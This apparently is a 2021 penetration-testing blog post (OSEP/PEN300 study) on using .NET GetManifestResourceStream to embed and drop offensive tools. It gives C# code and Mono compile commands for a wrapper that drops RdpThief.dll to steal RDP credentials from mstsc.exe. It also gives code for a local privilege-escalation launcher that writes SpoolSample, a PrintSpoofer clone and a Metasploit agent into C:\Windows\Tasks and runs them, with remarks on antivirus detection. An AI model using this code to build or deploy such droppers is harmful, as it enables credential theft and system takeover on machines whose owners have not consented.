---
title: "Taking Advantage of Assembly.GetManifestResourceStream for Quick Dirty Hacks"
date: 2021-12-01T04:32:52Z
categories: ["Programming", "Security"]
tags: ["OSEP", "PEN300", "C#", ".NET", "Resource Stream"]
---

We all get lazy from time to time, but things need to be done, in this post I am going to share with you a dirty hack that I used to avoid translating a solution written in a X programming language to another programming language. The scenario that we are going to cover here is that let's say we wrote a piece of code that does something but requires another tool to achieve the next step of the aimed goal. One option is to download that tool to disk either manually or using the API of the language your are writing the solution or take advantage of resource stream.

I initially started with the first option then I have figured out that it does not scale right, even if it does work, although we need to note that even the second option is not that ideal due to a lack of control, hence using "dirty hack" expression.

That being said let us dive into the meat of the subject, in order to properly illustrate the idea, we will go through two solutions I have implemented.

C# client for RDPThief:

@0x09AL made a nice tool to steal RDP credential leveraging binary instrumentation, you can find the link of the project in the references section. The tool is a DLL written C++, the usage is quite simple, you inject the DLL into mstsc.exe process. This example fit the description we talked about earlier.

Thanks to .NET Assembly.GetManifestResourceStream() method we can embed RDPThief.dll in our C# project, best of all this works well when loading with .NET assembly in memory. With no further due here is the piece of code that I have found in stackoverflow that allow us to extract embedded resources to disk:

```C#
// Source: https://stackoverflow.com/questions/2989400/store-files-in-c-sharp-exe-file/2989496

public static void WriteResourceToFile(string resourceName, string fileName)
{
	try
	{
		int bufferSize = 4096; // set 4KB buffer
		byte[] buffer = new byte[bufferSize];
		using (Stream input = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
		using (Stream output = new FileStream(fileName, FileMode.Create))
		{
		int byteCount = input.Read(buffer, 0, bufferSize);
		while (byteCount > 0)
		{
		output.Write(buffer, 0, byteCount);
		byteCount = input.Read(buffer, 0, bufferSize);
		}
		}
	}
	catch (Exception e) { Console.WriteLine(e.Message); }
}
```

It is important to note that this is not OPSEC safe, resource stream is not something new, if one of the embedded files is flagged by the anti-virus it is game over.  
You can find the complete source code of the RDPThief client here:

https://gist.github.com/tahadraidia/74540f5749d83b2fcbb317187cd18205

Compile command used (Mono C# compiler):

```sh
mcs -target:exe -platform:x64 -out:rdpthief.exe -resource:RdpThief.dll *.cs
```

LPE Through Print Bug:

This implementation leverage the SpoolSample application to privilege escalate by forcing it to run our Metasploit agent. This will use similar approach then before, however, this project requires the agent to be compiled and placed in a specific location of our choice. 

This time three files will be embedded in the project, the SpoolSample application, Metasploit agent and our implementation of printSpoofer in .NET, although this good be properly integrated in the code main code base of this project, once again time is precious here.

```C#
const string spoolsample = @"C:\Windows\Tasks\SpoolSample.exe";
const string spoof = @"C:\Windows\Tasks\spoof.exe";
const string local = @"C:\Windows\Tasks\local.exe";
string hostname = Dns.GetHostName();
// Check for file on Disk
var files = new List<String>();
files.Add(spoolsample);
files.Add(spoof);
files.Add(local);

Regex regx = new Regex("[a-zA-Z0-9]+.exe");
foreach (string file in files)
{
	if(!File.Exists(file))
	{
	MatchCollection matched= regx.Matches(file);
	if(matched.Count == 1)
	{
	WriteResourceToFile(matched[0].Value, file);
	}
}
}
```

Above code copies files into disk, and the code below is where magic happens.

```C#
...
// Give it time.
Thread.Sleep(3000);
// Bail if files does not exists on disk.
if (!File.Exists(spoof) || !File.Exists(spoolsample))
	System.Environment.Exit(0);

string spoolsampleparam = String.Format("{0} {0}/pipe/test", hostname);
Runner runner1 = new Runner(spoof, @"\\.\pipe\test\pipe\spoolss");
Runner runner2 = new Runner(spoolsample, spoolsampleparam);
Thread th1 = new Thread(new ThreadStart(runner1.Execute));
th1.Start();

if (th1.ThreadState == System.Threading.ThreadState.Running)
	new Thread(new ThreadStart(runner2.Execute)).Start();
...
```

The code is self-explanatory, also loads of resources only could be found on this subject, as for the first code, you can find the full version here:

https://gist.github.com/tahadraidia/74540f5749d83b2fcbb317187cd18205

Compile command used (Mono C# compiler):

```sh
mcs -target:exe -platform:x64 -out:lpeprintbug.exe -resource:spoof.exe -resource:SpoolSample.exe -resource:local.exe *.cs
```

References:
- https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.getmanifestresourcestream?view=net-6.0
- https://twitter.com/0x09AL
- https://github.com/0x09AL/RdpThief
- https://github.com/leechristensen/SpoolSample
